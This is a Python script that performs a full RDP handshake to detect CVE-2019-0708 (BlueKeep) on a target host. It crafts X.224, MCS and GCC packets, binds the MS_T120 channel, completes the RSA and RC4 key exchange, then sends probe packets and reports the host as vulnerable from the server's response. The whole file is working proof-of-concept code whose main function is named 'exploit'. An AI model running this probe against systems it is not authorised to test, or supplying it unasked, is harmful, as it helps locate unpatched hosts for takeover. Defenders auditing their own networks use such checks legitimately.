import sys
import struct
import socket
import hashlib
from Crypto.Cipher import ARC4
import binascii
import time
import argparse

R = '\033[91m'  # red
W = '\033[0m'  # white

def parser_error(errmsg):
    print("Usage: python " + sys.argv[0] + " [Options] use -h for help")
    print(R + "Error: " + errmsg + W)
    sys.exit()


def parse_args():
    parser = argparse.ArgumentParser(epilog='\tExample: \r\npython ' + sys.argv[0] + " [options]")
    parser.error = parser_error
    parser._optionals.title = "OPTIONS"
    parser.add_argument('--host', help="target ip to scan for CVE-2019-0708 - BlueKeep")
 
    return parser.parse_args()

def error_msg(msg):
    print(R + "Error: " + msg + W)
    sys.exit()


def hexdump(src, length=16):
    FILTER = ''.join([(len(repr(chr(x))) == 3) and chr(x) or '.' for x in range(256)])
    lines = []
    for c in xrange(0, len(src), length):
        chars = src[c:c+length]
        hex = ' '.join(["%02x" % ord(x) for x in chars])
        printable = ''.join(["%s" % ((ord(x) <= 127 and FILTER[ord(x)]) or '.') for x in chars])
        lines.append("%04x  %-*s  %s\n" % (c, length*3, hex, printable))
    return ''.join(lines)




def check_rdp_vuln(username):
    x_224_conn_req = "\x03\x00\x00" + "{0}"                       # TPKT Header
    x_224_conn_req+=  chr(33+len(username))      # X.224: Length indicator
    x_224_conn_req+= "\xe0"                                  # X.224: Type - TPDU
    x_224_conn_req+= "\x00\x00"                              # X.224: Destination reference
    x_224_conn_req+= "\x00\x00"                              # X.224: Source reference
    x_224_conn_req+= "\x00"                                  # X.224: Class and options
    x_224_conn_req+= "\x43\x6f\x6f\x6b\x69\x65\x3a\x20\x6d\x73\x74\x73\x68\x61\x73\x68\x3d" # "Cookie: mstshash=
    x_224_conn_req+=  username                         # coookie value 
    x_224_conn_req+= "\x0d\x0a"                              # Cookie terminator sequence
    x_224_conn_req+= "\x01"                                  # Type: RDP_NEG_REQ)
    x_224_conn_req+=  "\x00"                                 # RDP_NEG_REQ::flags 
    x_224_conn_req+=  "\x08\x00"                             # RDP_NEG_REQ::length (8 bytes)
    x_224_conn_req+=  "\x00\x00\x00\x00"                     # Requested protocols (PROTOCOL_RDP)

    return x_224_conn_req

def pdu_connect_initial(hostname):
    host_name = ""
    for i in hostname:
        host_name+=struct.pack("<h",ord(i))
    host_name+= "\x00"*(32-len(host_name))

    mcs_gcc_request = ("\x03\x00\x01\xca" # TPKT Header
    "\x02\xf0\x80"             # x.224
    "\x7f\x65\x82\x01\xbe" # change here
    "\x04\x01\x01\x04"
    "\x01\x01\x01\x01\xff"
    "\x30\x20\x02\x02\x00\x22\x02\x02\x00\x02\x02\x02\x00\x00\x02\x02\x00\x01\x02\x02\x00\x00\x02\x02\x00\x01\x02\x02\xff\xff\x02\x02\x00\x02\x30\x20"
    "\x02\x02\x00\x01\x02\x02\x00\x01\x02\x02\x00\x01\x02\x02\x00\x01\x02\x02\x00\x00\x02\x02\x00\x01\x02\x02\x04\x20\x02\x02\x00\x02\x30\x20\x02\x02"
    "\xff\xff\x02\x02\xfc\x17\x02\x02\xff\xff\x02\x02\x00\x01\x02\x02\x00\x00\x02\x02\x00\x01\x02\x02\xff\xff\x02\x02\x00\x02\x04\x82\x01\x4b" # chnage here
    "\x00\x05\x00\x14\x7c\x00\x01\x81\x42" # change here - ConnectPDU
    "\x00\x08\x00\x10\x00\x01\xc0\x00\x44\x75\x63\x61\x81\x34" # chnage here 
    "\x01\xc0\xd8\x00\x04\x00\x08\x00\x20\x03\x58\x02\x01\xca\x03\xaa\x09\x04\x00\x00\x28\x0a\x00\x00")


    mcs_gcc_request+= host_name # Client name -32 Bytes - we45-lt35
    
    mcs_gcc_request+=(
    "\x04\x00\x00\x00\x00\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\xca\x01\x00\x00\x00\x00\x00\x18\x00\x07\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\xc0\x0c\x00\x09\x00\x00\x00\x00\x00\x00\x00\x02\xc0\x0c\x00\x03\x00\x00\x00\x00\x00\x00\x00"
    "\x03\xc0"
    "\x44\x00"
    "\x04\x00\x00\x00" #channel count
    "\x63\x6c\x69\x70\x72\x64\x72\x00\xc0\xa0\x00\x00" #cliprdr
    "\x4d\x53\x5f\x54\x31\x32\x30\x00\x00\x00\x00\x00" #MS_T120
    "\x72\x64\x70\x73\x6e\x64\x00\x00\xc0\x00\x00\x00" #rdpsnd
    "\x73\x6e\x64\x64\x62\x67\x00\x00\xc0\x00\x00\x00" #snddbg
    "\x72\x64\x70\x64\x72\x00\x00\x00\x80\x80\x00\x00" #rdpdr
    )

    return mcs_gcc_request

def hex_str_conv(hex_str):
    hex_res = ""

    for i in bytearray(hex_str):
        hex_res+="\\x"
        hex_res+="%02x"%i

    return hex_res

def bin_to_hex(s):
    return s.encode("hex")

def bytes_to_bignum(bytesIn, order = "little"):
    
    if order == "little":
        bytesIn = bytesIn[::-1]

    bytes = bin_to_hex(bytesIn)
    s = "0x"+bytes
    return int(s,16)

def int_to_bytestring(daInt):
    hex_pkt = "%x"%daInt
    return binascii.unhexlify(hex_pkt)[::-1]


def rsa_encrypt(bignum, rsexp, rsmod):
    return (bignum ** rsexp) % rsmod

def rdp_rc4_crypt(rc4obj, data):
    return rc4obj.encrypt(data)


def rdp_parse_serverdata(pkt):
    ptr = 0
    rdp_pkt = pkt[0x49:]

    while ptr < len(rdp_pkt):
        header_type = rdp_pkt[ptr:ptr+2]
        header_length = struct.unpack("<h",rdp_pkt[ptr+2:ptr+4])[0]

        print("- Header: {}  Len: {}".format(bin_to_hex(header_type),header_length))

        if header_type == "\x02\x0c":
            print("- Security Header")
            # print("Header Length: {}".format(header_length))
            server_random = rdp_pkt[ptr+20:ptr+52]
            public_exponent = rdp_pkt[ptr+84:ptr+88]

            
            modulus = rdp_pkt[ptr+88:ptr+152]
            print("- modulus_old: {}".format(bin_to_hex(modulus)))
            rsa_magic = rdp_pkt[ptr+68:ptr+72]

            if rsa_magic != "RSA1":
                print("Server cert isn't RSA, this scenario isn't supported (yet).")
                # sys.exit(1)

            print("- RSA magic: {}".format(rsa_magic))
            bitlen = struct.unpack("<L",rdp_pkt[ptr+72:ptr+76])[0] - 8
            print("- RSA bitlen: {}".format(bitlen))
            modulus = rdp_pkt[ptr+88:ptr+87+1+bitlen]
            print("- modulus_new: {}".format(bin_to_hex(modulus)))
    
        ptr += header_length

    print("- SERVER_MODULUS: {}".format(bin_to_hex(modulus)))
    print("- SERVER_EXPONENT: {}".format(bin_to_hex(public_exponent)))
    print("- SERVER_RANDOM: {}".format(bin_to_hex(server_random)))

    rsmod = bytes_to_bignum(modulus)
    rsexp = bytes_to_bignum(public_exponent)
    rsran = bytes_to_bignum(server_random)

    return rsmod, rsexp, rsran, server_random, bitlen



def pdu_channel_request(userid,channel):
    join_req = "\x03\x00\x00\x0c\x02\xf0\x80\x38"
    join_req+= struct.pack(">hh",userid,channel)
    return join_req


def mcs_erect_domain_pdu():
    mcs_erect_domain_pdu = "\x03\x00\x00\x0c\x02\xf0\x80\x04\x00\x01\x00\x01"
    return mcs_erect_domain_pdu

def msc_attach_user_pdu():
    msc_attach_user_pdu = "\x03\x00\x00\x08\x02\xf0\x80\x28"
    return msc_attach_user_pdu

def pdu_security_exchange(rcran, rsexp, rsmod, bitlen):
    encrypted_rcran_bignum = rsa_encrypt(rcran, rsexp, rsmod)
    encrypted_rcran = int_to_bytestring(encrypted_rcran_bignum)

    bitlen += 8
    bitlen_hex = struct.pack("<L",bitlen)

    print("Encrypted client random: {}".format(bin_to_hex(encrypted_rcran)))

    userdata_length = 8 + bitlen
    userdata_length_low = userdata_length & 0xFF
    userdata_length_high = userdata_length / 256

    flags = 0x80 | userdata_length_high

    pkt = "\x03\x00"
    pkt+=struct.pack(">h",userdata_length+15) # TPKT
    pkt+="\x02\xf0\x80" # X.224
    pkt+="\x64" # sendDataRequest
    pkt+="\x00\x08" # intiator userId
    pkt+="\x03\xeb" # channelId = 1003
    pkt+="\x70" # dataPriority
    pkt+=struct.pack("h",flags)[0]
    pkt+=struct.pack("h",userdata_length_low)[0] # UserData length
    pkt+="\x01\x00" # securityHeader flags
    pkt+="\x00\x00" # securityHeader flagsHi
    pkt+= bitlen_hex # securityPkt length
    pkt+= encrypted_rcran # 64 bytes encrypted client random
    pkt+= "\x00\x00\x00\x00\x00\x00\x00\x00" # 8 bytes rear padding (always present)

    return pkt

def rdp_salted_hash(s_bytes, i_bytes, clientRandom_bytes, serverRandom_bytes):
    hash_sha1 = hashlib.new("sha1")
    hash_sha1.update(i_bytes)
    hash_sha1.update(s_bytes)
    hash_sha1.update(clientRandom_bytes)
    hash_sha1.update(serverRandom_bytes)

    hash_md5=hashlib.md5()
    hash_md5.update(s_bytes)
    hash_md5.update(binascii.unhexlify(hash_sha1.hexdigest()))

    return binascii.unhexlify(hash_md5.hexdigest())
     

def rdp_final_hash(k, clientRandom_bytes, serverRandom_bytes):
    md5 = hashlib.md5()

    md5.update(k)
    md5.update(clientRandom_bytes)
    md5.update(serverRandom_bytes)

    return binascii.unhexlify(md5.hexdigest())

def rdp_hmac(mac_salt_key, data_content):
    sha1 = hashlib.sha1()
    md5 =  hashlib.md5()

    pad1 = "\x36" * 40
    pad2 = "\x5c" * 48

    sha1.update(mac_salt_key)
    sha1.update(pad1)
    sha1.update(struct.pack('<L',len(data_content)))
    sha1.update(data_content)

    md5.update(mac_salt_key)
    md5.update(pad2)
    md5.update(binascii.unhexlify(sha1.hexdigest()))

    return binascii.unhexlify(md5.hexdigest())



def rdp_calculate_rc4_keys(client_random, server_random):

    preMasterSecret = client_random[0:24] + server_random[0:24]
    masterSecret = rdp_salted_hash(preMasterSecret,"A",client_random,server_random) +  rdp_salted_hash(preMasterSecret,"BB",client_random,server_random) + rdp_salted_hash(preMasterSecret,"CCC",client_random,server_random)
    sessionKeyBlob = rdp_salted_hash(masterSecret,"X",client_random,server_random) +  rdp_salted_hash(masterSecret,"YY",client_random,server_random) + rdp_salted_hash(masterSecret,"ZZZ",client_random,server_random)
    initialClientDecryptKey128 = rdp_final_hash(sessionKeyBlob[16:32], client_random, server_random)
    initialClientEncryptKey128 = rdp_final_hash(sessionKeyBlob[32:48], client_random, server_random)

    macKey = sessionKeyBlob[0:16]

    print("PreMasterSecret = {}".format(bin_to_hex(preMasterSecret)))
    print("MasterSecret = {}".format(bin_to_hex(masterSecret)))
    print("sessionKeyBlob = {}".format(bin_to_hex(sessionKeyBlob)))
    print("macKey = {}".format(bin_to_hex(macKey)))
    print("initialClientDecryptKey128 = {}".format(bin_to_hex(initialClientDecryptKey128)))
    print("initialClientEncryptKey128 = {}".format(bin_to_hex(initialClientEncryptKey128)))

    return initialClientEncryptKey128, initialClientDecryptKey128, macKey, sessionKeyBlob


def pdu_client_info():
    data = "000000003301000000000a000000000000000000"
    data+="75007300650072003000" # FIXME: username
    data+="000000000000000002001c00"
    data+="3100390032002e003100360038002e0031002e00320030003800" # FIXME: ip
    data+="00003c0043003a005c00570049004e004e0054005c00530079007300740065006d00330032005c006d007300740073006300610078002e0064006c006c000000a40100004700540042002c0020006e006f0072006d0061006c0074006900640000000000000000000000000000000000000000000000000000000000000000000000000000000a00000005000300000000000000000000004700540042002c00200073006f006d006d006100720074006900640000000000000000000000000000000000000000000000000000000000000000000000000000000300000005000200000000000000c4ffffff00000000270000000000"

    return binascii.unhexlify(data)


def pdu_client_confirm_active():
    data = "a4011300f103ea030100ea0306008e014d53545343000e00000001001800010003000002000000000d04000000000000000002001c00100001000100010020035802000001000100000001000000030058000000000000000000000000000000000000000000010014000000010047012a000101010100000000010101010001010000000000010101000001010100000000a1060000000000000084030000000000e40400001300280000000003780000007800000050010000000000000000000000000000000000000000000008000a000100140014000a0008000600000007000c00000000000000000005000c00000000000200020009000800000000000f000800010000000d005800010000000904000004000000000000000c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c000800010000000e0008000100000010003400fe000400fe000400fe000800fe000800fe001000fe002000fe004000fe008000fe000001400000080001000102000000"
    return binascii.unhexlify(data)


def pdu_client_persistent_key_list():
    data = "49031700f103ea03010000013b031c00000001000000000000000000000000000000aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
    return binascii.unhexlify(data)

def rdp_encrypted_pkt(data, rc4enckey, hmackey, flags = "\x08\x00", flagsHi = "\x00\x00", channelId="\x03\xeb"):

    userData_len = len(data) + 12
    udl_with_flag = 0x8000 | userData_len
    pkt = "\x02\xf0\x80" # X.224
    pkt+= "\x64" # sendDataRequest
    pkt+= "\x00\x08" # intiator userId .. TODO: for a functional client this isn't static
    pkt+= channelId # channelId = 1003
    pkt+= "\x70" # dataPriority
    pkt+= binascii.unhexlify("%x"%udl_with_flag)
    pkt+= flags #{}"\x48\x00" # flags  SEC_INFO_PKT | SEC_ENCRYPT
    pkt+= flagsHi # flagsHi

    pkt+= rdp_hmac(hmackey, data)[0:8]
    pkt+= rdp_rc4_crypt(rc4enckey, data)

    tpkt = "\x03\x00"
    tpkt+=struct.pack(">h",len(pkt) + 4)
    tpkt+=pkt

    return tpkt

def try_check(s,rc4enckey, hmackey):
    for i in range(0,6):
        res = s.recv(1024)
    
    for i in range(0,6):
        pkt = rdp_encrypted_pkt(binascii.unhexlify("100000000300000000000000020000000000000000000000"), rc4enckey, hmackey, "\x08\x00", "\x00\x00", "\x03\xed")
        s.sendall(pkt)
        pkt = rdp_encrypted_pkt(binascii.unhexlify("20000000030000000000000000000000020000000000000000000000000000000000000000000000"), rc4enckey, hmackey, "\x08\x00", "\x00\x00", "\x03\xed")
        s.sendall(pkt)

        for i in range(0,4):
          res = s.recv(1024)
          if binascii.unhexlify("0300000902f0802180") in res:
            print("[+] Found MCS Disconnect Provider Ultimatum PDU Packet")
            print("[+] Vulnerable....Vulnerable.... Vulnerable")
            print("[+] HexDump: MCS Disconnect Provider Ultimatum PDU")
            print hexdump(res)





def exploit(host,port,hostname,username):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))

    print("[+] Verifying RDP Portocol....")    
    x_224_conn_req = check_rdp_vuln(username)
    s.sendall(x_224_conn_req.format(chr(33+len(username)+5)))
    s.recv(8192)

    print "[+] PDU X.224 Response Received."
    print "[+] Sending MCS Connect Initial PDU with GCC Conference." 
    s.sendall(pdu_connect_initial(hostname))
    res = s.recv(10000)


    print "[+] MCS Response PDU with GCC Conference Received."
    rsmod, rsexp, rsran, server_rand, bitlen = rdp_parse_serverdata(res)


    print "[+] Sending MCS Erect Request."
    s.sendall(mcs_erect_domain_pdu())

    print "[+] Sending MCS Attach User PDU Request."
    s.sendall(msc_attach_user_pdu())

    res = s.recv(8192)
    mcs_packet = bytearray(res)
    user1= mcs_packet[9] + mcs_packet[10]

    print("[+] Send PDU  Request for 7 channel with AttachUserConfirm::initiator: {}".format(user1))
    s.sendall(pdu_channel_request(user1, 1009))
    s.recv(8192)
    s.sendall(pdu_channel_request(user1, 1003))
    s.recv(8192)
    s.sendall(pdu_channel_request(user1, 1004))
    s.recv(8192)
    s.sendall(pdu_channel_request(user1, 1005))
    s.recv(8192)
    s.sendall(pdu_channel_request(user1, 1006))
    s.recv(8192)
    s.sendall(pdu_channel_request(user1, 1007))
    s.recv(8192)
    s.sendall(pdu_channel_request(user1, 1008))
    s.recv(8192)

    client_rand = "\x41" * 32
    rcran = bytes_to_bignum(client_rand)

    print("[+] Sending security exchange PDU")
    s.sendall(pdu_security_exchange(rcran, rsexp, rsmod, bitlen))

    rc4encstart, rc4decstart, hmackey, sessblob = rdp_calculate_rc4_keys(client_rand, server_rand)

    print("- RC4_ENC_KEY: {}".format(bin_to_hex(rc4encstart)))
    print("- RC4_DEC_KEY: {}".format(bin_to_hex(rc4decstart)))
    print("- HMAC_KEY: {}".format(bin_to_hex(hmackey)))
    print("- SESS_BLOB: {}".format(bin_to_hex(sessblob)))

    rc4enckey = ARC4.new(rc4encstart)

    print("[+] Sending encrypted client info PDU")
    s.sendall(rdp_encrypted_pkt(pdu_client_info(), rc4enckey, hmackey, "\x48\x00"))
    res = s.recv(8192)

    print("[+] Received License packet: {}".format(bin_to_hex(res)))

    res = s.recv(8192)
    print("[+] Received Server Demand packet: {}".format(bin_to_hex(res)))

    print("[+] Sending client confirm active PDU")
    s.sendall(rdp_encrypted_pkt(pdu_client_confirm_active(), rc4enckey, hmackey, "\x38\x00"))

    print("[+] Sending client synchronize PDU")
    print("[+] Sending client control cooperate PDU")
    synch = rdp_encrypted_pkt(binascii.unhexlify("16001700f103ea030100000108001f0000000100ea03"), rc4enckey, hmackey)
    coop = rdp_encrypted_pkt(binascii.unhexlify("1a001700f103ea03010000010c00140000000400000000000000"), rc4enckey, hmackey)
    s.sendall(synch + coop)

    print("[+] Sending client control request control PDU")
    s.sendall(rdp_encrypted_pkt(binascii.unhexlify("1a001700f103ea03010000010c00140000000100000000000000"), rc4enckey, hmackey))

    print("[+] Sending client persistent key list PDU")
    s.sendall(rdp_encrypted_pkt(pdu_client_persistent_key_list(), rc4enckey, hmackey))

    print("[+] Sending client font list PDU")
    s.sendall(rdp_encrypted_pkt(binascii.unhexlify("1a001700f103ea03010000010c00270000000000000003003200"), rc4enckey, hmackey))

    result = try_check(s,rc4enckey, hmackey)


if __name__ == "__main__":
    args = parse_args()
    host = args.host

    port=3389
    hostname="eltons-dev"
    username="elton"
    exploit(host,port,hostname,username)

